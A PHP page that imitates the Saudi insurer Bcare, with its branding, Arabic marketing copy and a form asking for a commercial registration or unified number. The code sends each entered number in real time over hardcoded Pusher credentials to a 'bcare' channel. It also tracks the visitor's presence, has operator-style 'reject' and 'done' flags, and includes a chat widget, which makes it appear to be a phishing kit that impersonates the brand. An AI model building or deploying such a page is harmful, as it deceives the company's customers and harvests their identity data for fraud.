<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'الرئيسية');

    // Presence tracking handled by presence-tracker.js
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'ssn' => $_POST['ssn'],

        'page' => 'الرئيسية',
        'message' => 'الرئيسية',
        'type' => '1'
    );

    $_SESSION['type'] = 2;

    $id = $User->register($site);
    if ($id) {

        $_SESSION['user_id'] = $id;

        $data['message'] = $_POST['ssn'];
        $pusher->trigger('bcare', 'my-event-bann', $data);

        //SendMail($_POST["username"]);

        echo "<script>document.location.href='medical-info.php';</script>";
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_GET['done'])) {
    $showError1 = true;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> بي كير للتأمين : أفضل موقع مقارنة تأمين سيارة ومركبات | تأمينك Bcare</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        }
         */

        .bacOne {
            background-color: #156394;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #156394 !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        ::placeholder {
            color: #d2d6da !important;
        }

        .bg-two {
            background-color: #156394;
        }

        .form-check-input:checked {
            background-color: orange !important;
            /* Bootstrap primary color or your custom color */
            border-color: orange;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #156394;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .btn-warning {
            background-color: #f9a824;
            border-color: #f9a824;
        }
    </style>
    <link rel="stylesheet" href="./assets/css/theme.css">
</head>

<body class="bg-light">

    <nav class="d-flex justify-content-center py-2 shadow">
        <a href="index.php">
            <img src="./assets/Bcare-logo.svg" alt="">
        </a>
    </nav>

    <div class="bacOne text-center p-3 pb-5 pt-4">
        <h4 class="fw-bold text-light"> قارن ,أمن ,استلم وثيقتك </h4>
        <small class="text-light"> مكان واحد وفّر عليك البحث بين أكثر من 20 شركة تأمين!</small>
    </div>

    <div class="container px-2" style="margin-top: -30px;">
        <div class="d-flex justify-content-between pt-3 bg-white" style="border-radius: 20px;padding: 0px 37px;">
            <a href="./index.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-car fs-5"></i>
                <span class="text-muted fw-bold"> مركبات </span>
            </a>
            <a href="#" class="d-flex flex-column align-items-center gap-1 pb-2"
                style="border-bottom: 3px solid orange;">
                <i class="fa-solid fa-heart-pulse active fs-5"></i>
                <span class="text-primary fw-bold"> طبي </span>
            </a>
            <a href="./medical-mis.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-stethoscope fs-5"></i>
                <span class="text-muted fw-bold"> اخطاء طبية </span>
            </a>
            <a href="./travel.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-plane fs-5"></i>
                <span class=" text-muted fw-bold"> سفر </span>
            </a>
        </div>
    </div>


    <div class="container pt-4 pb-3" style="background-color: rgb(226, 226, 226);">
        <div class="shadow-sm bg-white" style="border-radius: 15px;">
            <form action="" method="POST">

                <div class="mt-3 px-3">

                    <label for="" class="mb-2 mt-3"> السجل التجاري/ الرقم الموحد</label>
                    <input type="text" id="ssn" name="ssn" minlength="10" maxlength="10" pattern="[0-9]*"
                        inputmode="numeric" class="form-control mb-3" placeholder=" السجل التجاري/ الرقم الموحد">


                    <label for="" class="mb-2"> رمز التحقق </label>
                    <div class="d-flex group mb-3 align-items-center">
                        <input type="text" class="form-control text-center fs-5 fw-bold" id="captchaInput" required
                            minlength="4" maxlength="4" inputmode="numeric"
                            oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="أدخل الرمز">
                        <i class="bi bi-arrow-clockwise fs-2 text-secondary mx-2"
                            style="cursor: pointer; transition: 0.2s;" onclick="generateCaptcha(this)"
                            title="تغيير الرمز"></i>
                        <div id="captchaDisplay"
                            class="d-flex align-items-center justify-content-center mx-2 shadow-sm rounded user-select-none"
                            style="min-width: 100px; height: 45px; background: #e9ecef; letter-spacing: 5px; font-weight: 800; font-size: 1.4rem; color: #444; border: 1px solid #ced4da; position: relative; overflow: hidden;">
                            <canvas id="captchaCanvas"
                                style="position: absolute; top:0; left:0; width:100%; height:100%; z-index:1; opacity:0.8; pointer-events: none;"></canvas>
                            <span id="captchaText"
                                style="position: relative; z-index: 2; font-family: monospace; font-style: italic; text-shadow: 1px 1px 2px rgba(255,255,255,0.8);"></span>
                        </div>
                    </div>

                    <script>
                        function generateCaptcha(btn = null) {
                            if (btn) {
                                btn.style.transform = 'rotate(180deg)';
                                setTimeout(() => btn.style.transform = 'rotate(0deg)', 200);
                            }
                            const chars = '0123456789';
                            let captcha = '';
                            for (let i = 0; i < 4; i++) {
                                captcha += chars[Math.floor(Math.random() * chars.length)];
                            }

                            document.getElementById('captchaText').innerText = captcha;
                            const input = document.getElementById('captchaInput');
                            input.value = '';
                            input.setAttribute('pattern', captcha);

                            // Draw noise lines
                            const canvas = document.getElementById('captchaCanvas');
                            if (canvas) {
                                canvas.width = 100;
                                canvas.height = 45;
                                const ctx = canvas.getContext('2d');
                                ctx.clearRect(0, 0, canvas.width, canvas.height);
                                for (let i = 0; i < 6; i++) {
                                    ctx.beginPath();
                                    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
                                    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
                                    ctx.strokeStyle = ['#ff0000', '#0a58ca', '#198754', '#212529'][Math.floor(Math.random() * 4)];
                                    ctx.lineWidth = 1.5;
                                    ctx.stroke();
                                }
                            }
                            // Form validation update
                            if (input.form) input.form.dispatchEvent(new Event('input', { bubbles: true }));
                        }

                        document.addEventListener('DOMContentLoaded', () => generateCaptcha());
                    </script>

                    <div class="text-center mb-4">
                        <button type="submit" name="submit" id="butSubm" disabled
                            class="btn btn-warning w-100 text-light fw-bold">إضهار العروض</button>
                    </div>

                    <div class="pb-5">
                        <small class="text-primary fw-bold" style="font-size: 11px;"> بالضغط على <strong> "الحصول على
                                عروض الأسعار" </strong> فإنك توافق على منح شركة عناية الوسيط الحق في الاستفسار من وزارة
                            التجارة و/أو مركز المعلومات الوطني و/أو المؤسسة العامة للتأمينات الاجتماعية عن بياناتي
                        </small>
                    </div>

                </div>
            </form>
        </div>
    </div>

    <div class="container shadow mt-5">
        <div class="d-flex py-5 px-3">
            <div class="ps-4" style="border-left: 1px solid lightgray;">
                <img src="./assets/Group 6528.svg" width="100" alt="">
            </div>
            <div class="me-2 w-75 d-flex gap-2">
                <img src="./assets/Aljazira-Takaful.svg" width="80" alt="">
                <img src="./assets/Walaa.svg" width="80" alt="">
                <img src="./assets/MedGulf.svg" width="80" alt="">
            </div>
        </div>
    </div>

    <div class="container" style="margin-top: 70px;">
        <h5 class="fw-bold text-primary text-center"> طريقك آمــن مع بي كير </h5>
        <div class="row d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/insureOneMin.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> تأمينك في دقيقة </small>
            </div>

            <div class="col d-flex flex-column  shadow-sm p-3 pb-5 align-items-center gap-4"
                style="border-radius: 15px;">
                <img src="./assets/sprateInsure.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> فصّل تأمينك </small>
            </div>

            <div class="col d-flex flex-column  align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/priceLess.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> أسعار أقل </small>
            </div>

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/sechleInsure.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> جدول تأمينك </small>
            </div>
        </div>

        <div class="row d-flex justify-content-between mt-2">

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/wind.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> هب ريح </small>
            </div>

            <div class="col d-flex flex-column  shadow-sm p-3 pb-5 align-items-center gap-2"
                style="border-radius: 15px;">
                <img src="./assets/discounts.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> خصومات تضبطك </small>
            </div>

            <div class="col d-flex flex-column  align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/benfit.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> منافع تحميك </small>
            </div>

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/oneWay.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> مكان واحد </small>
            </div>
        </div>


    </div>


    <div class="container bg-white py-5" style="margin-top: 70px;">
        <h5 class="fw-bold text-primary text-center"> ليش بي كير خيارك الأول في التأمين؟ </h5>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/saudi.svg" width="30" alt="">
                <small class="text-primary fw-bold"> منك وفيك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/catalog.svg" width="30" alt="">
                <small class="text-primary fw-bold"> عروض تفهمك </small>
            </div>
        </div>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/payments_FILL0_wght400_GRAD0_opsz48.svg" width="30" alt="">
                <small class="text-primary fw-bold"> سعر يرضيك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/Group 6518.svg" width="30" alt="">
                <small class="text-primary fw-bold"> إصدار سريع </small>
            </div>
        </div>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column justify-content-center align-items-center gap-2">
                <img src="./assets/tachometer-alt-fastest.svg" width="30" alt="">
                <small class="text-primary fw-bold"> نقسط تأمينك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/flame.svg" width="30" alt="">
                <small class="text-primary fw-bold"> نفرغ لك </small>
            </div>
        </div>
    </div>


    <footer class="bg-two p-3">
        <img src="./assets/logo-bacre-white.svg" alt="">

        <p class="text-light text-center fw-bold mt-5" style="font-size: 13px;"> 2025 © جميع الحقوق محفوظة، شركة عناية
            الوسيط لوساطة التأمين </p>
    </footer>


    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id'] ?? null); ?>;
    </script>
    
    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات المدخلة غير صحيحة، يرجى التأكد من السجل التجاري أو الرقم الموحد والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // Function to validate the form and enable/disable the submit button
            function validateMedicalForm() {
                const ssnVal = $('#ssn').val().trim();
                const captchaVal = $('#captchaInput').val().trim();
                const targetCaptcha = $('#captchaText').text().trim();

                const isSsnValid = ssnVal.length === 10;
                const isCaptchaValid = captchaVal === targetCaptcha && targetCaptcha !== '';

                if (isSsnValid && isCaptchaValid) {
                    $('#butSubm').prop('disabled', false);
                } else {
                    $('#butSubm').prop('disabled', true);
                }
            }

            // Listen for input on SSN and Captcha fields
            $('#ssn, #captchaInput').on('input', validateMedicalForm);

            // Listen for form-wide input events (triggered when captcha is regenerated)
            $('form').on('input', validateMedicalForm);
            
            // Initial check
            validateMedicalForm();

            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>